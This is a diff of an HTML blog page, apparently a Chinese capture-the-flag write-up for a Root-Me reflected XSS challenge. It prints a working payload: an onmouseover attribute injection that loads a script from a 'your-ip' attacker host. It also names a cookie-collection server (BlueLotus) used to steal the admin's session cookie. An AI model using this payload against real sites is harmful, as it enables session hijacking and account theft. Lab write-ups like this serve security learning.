@@ -28,8 +28,8 @@
 <meta property="og:description" content="直接看看有没有注入点  发现有个?p&#x3D;prices，尝试有没有注入点   报404，检查一波，  发现在链接内，可以构造一下  结果没反应，应该是被过滤掉了  发现onmousemove  和’ 可以用 但题目要求是admin 不会点击所有可疑的 XSS 链接 ，尝试本地构造隐形化xss,向服务器发送cookie， 服务器利用蓝莲花xss平台构建https:&#x2F;&#x2F;github.com&#x2F;fi">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-24T11:54:38.354Z">
-<meta property="article:modified_time" content="2025-12-24T11:54:38.354Z">
+<meta property="article:published_time" content="2025-12-24T12:00:03.469Z">
+<meta property="article:modified_time" content="2025-12-24T12:00:03.469Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
   <span class="sep"></span>
   <a class="cap breadcrumb" href="/wiki/WP/root-me/XSS%20-%20Reflected(%E5%8F%8D%E5%B0%84%E5%9E%8B)/">XSS - Reflected(反射型)</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:54:38.354Z">2025-12-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T12:00:03.469Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -163,13 +163,13 @@
 <p>结果没反应，应该是被过滤掉了</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1761213607732-df286f46-d038-49de-b35f-d9c272aeafe7.png"></p>
 <p>发现onmousemove  和’ 可以用</p>
-<p>但题目要求是admin 不会点击所有可疑的 XSS 链接 <font style="color:rgb(52, 73, 94);">，尝试本地构造隐形化xss,向服务器发送cookie，</font></p>
-<p><font style="color:rgb(52, 73, 94);">服务器利用蓝莲花xss平台构建</font><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p>但题目要求是admin 不会点击所有可疑的 XSS 链接 ，尝试本地构造隐形化xss,向服务器发送cookie，</p>
+<p>服务器利用蓝莲花xss平台构建<a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1761214002007-0f4460aa-ac31-4ed9-b319-d6512ab7871e.png"></p>
 <p>生成本地js,构建payload</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1761214103790-cb9eddba-000f-4e11-abcc-b2b6b30ef0ff.png"></p>
 <p>发现&#x2F;被过滤掉了,换种方式</p>
-<p><font style="color:rgb(0, 0, 0);">?p&#x3D;exp%27%20onmouseover&#x3D;%27(function(){var%20s&#x3D;document.createElement(%22script%22);s.src&#x3D;%22<a target="_blank" rel="noopener" href="http://your-ip/myjs/test.js%22;document.head.appendChild(s)%7D)()%27">http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27</a></font></p>
+<p>?p&#x3D;exp%27%20onmouseover&#x3D;%27(function(){var%20s&#x3D;document.createElement(%22script%22);s.src&#x3D;%22<a target="_blank" rel="noopener" href="http://your-ip/myjs/test.js%22;document.head.appendChild(s)%7D)()%27">http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27</a></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1761214263497-e23b9fee-e9b2-40bf-b1c2-d8ee353dca6f.png"></p>
 <p>给管理员提交你的报告，等待一段时间，就会返回内容，他会发送很多次，有时候没发过来，得多找一下</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1761214455641-35a544f6-87ed-4bac-92d1-07eaa54ea722.png"></p>
